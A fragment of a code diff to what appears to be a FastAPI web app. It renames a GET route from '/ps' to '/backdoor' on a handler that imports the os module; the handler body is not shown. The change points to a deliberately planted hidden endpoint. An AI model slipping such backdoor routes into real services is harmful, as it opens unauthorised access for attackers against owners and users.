@@ -12,7 +12,7 @@ async def root():
     return {"message": "Hello World"}
 
 
-@app.get("/ps")
+@app.get("/backdoor")
 async def new():
     import os
 
